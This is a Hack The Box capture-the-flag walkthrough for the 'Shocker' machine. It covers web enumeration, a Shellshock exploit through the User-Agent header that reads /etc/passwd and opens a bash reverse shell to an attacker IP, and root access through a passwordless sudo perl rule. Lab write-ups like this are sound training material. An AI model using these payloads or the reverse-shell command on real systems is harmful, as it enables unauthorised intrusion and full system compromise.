
# HTB - Shocker Writeup

## Target Information

Machine Name: Shocker  
Platform: Hack The Box  
Target IP: 10.129.9.196  
Attacker IP: 10.10.14.212  
Difficulty: Easy  

---

# 1. Reconnaissance

## Nmap Scan

```bash
nmap -sC -sV -p- 10.129.9.196
```

Results:

- Port 80 open
- Apache 2.4.18 (Ubuntu)

Since Apache is running, common default paths should be tested:

- /cgi-bin/
- /server-status
- /robots.txt

---

# 2. Web Enumeration

## Testing Server Behavior

Before fuzzing, check how the server responds to random paths:

```bash
curl -I http://10.129.9.196/random123
```

Response:

```
HTTP/1.1 404 Not Found
```

This confirms:
- The server properly returns 404
- We can safely use `-fc 404` in ffuf

---

## Directory Enumeration

```bash
ffuf -u http://10.129.9.196/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-fc 404 \
-c
```

Result:

```
/cgi-bin/ (403)
```

403 means:
- Directory exists
- Listing is disabled

Next step: enumerate inside `/cgi-bin/`.

---

## Enumerating CGI Scripts

```bash
ffuf -u http://10.129.9.196/cgi-bin/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-e .sh,.cgi,.pl \
-fc 404 \
-c
```

Result:

```
user.sh (200)
```

---

# 3. Analyzing user.sh

Test the script:

```bash
curl http://10.129.9.196/cgi-bin/user.sh
```

Output:

```
Just an uptime test script
14:18:38 up 1:49 ...
```

This confirms:
- It is a Bash CGI script
- It executes the `uptime` command
- CGI + Bash = possible Shellshock vulnerability

---

# 4. Exploiting Shellshock

Shellshock payload format:

```
() { :; }; COMMAND
```

Test command execution:

```bash
curl -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd" \
http://10.129.9.196/cgi-bin/user.sh
```

Successful output of `/etc/passwd` confirms:
- Remote Command Execution (RCE)
- Shellshock vulnerability present

---

# 5. Gaining Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Send reverse shell:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.212/4444 0>&1"' \
http://10.129.9.196/cgi-bin/user.sh
```

Connection received.

---

# 6. Initial Access

Check user:

```bash
id
```

Output:

```
uid=1000(shelly)
```

We gained shell as user **shelly**.

Stabilize shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# 7. Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/perl
```

User can run perl as root without password.

---

## Exploiting Perl

Perl can execute system commands.

Escalate to root:

```bash
sudo perl -e 'exec "/bin/bash";'
```

Verify:

```bash
whoami
```

Output:

```
root
```

Root access obtained.

---

# 8. Flags

User flag:

```bash
cat /home/shelly/user.txt
```

Root flag:

```bash
cat /root/root.txt
```

---

# Exploitation Chain Summary

1. Enumerated Apache web server  
2. Found `/cgi-bin/` directory  
3. Discovered `user.sh` CGI script  
4. Exploited Shellshock via User-Agent header  
5. Gained reverse shell as shelly  
6. Found sudo privilege for perl  
7. Escalated to root  

---

# Key Takeaways

- Always test server behavior before fuzzing  
- 403 means directory exists  
- CGI + Bash should trigger Shellshock testing  
- Always check `sudo -l`  
- Use GTFOBins for privilege escalation  
